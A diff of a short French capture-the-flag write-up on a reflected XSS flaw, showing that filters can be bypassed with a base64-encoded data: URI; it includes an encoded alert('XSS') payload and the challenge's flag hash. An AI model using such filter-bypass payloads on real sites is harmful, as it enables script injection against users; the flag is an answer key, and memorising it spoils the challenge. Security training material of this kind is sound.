@@ -1,5 +1,5 @@
 # Nom de la faille
-ReflectedBase64 
+ReflectedBase64
 
 ## Définition
 On peut contourner certains filtres XSS en utilisant une URI de type `data:` encodée en **base64**.
@@ -28,7 +28,7 @@ Exemple avec HTML encodé :
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
 ```
 
-## Flag obtenu
+- Flag obtenu:
 
 ```
 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
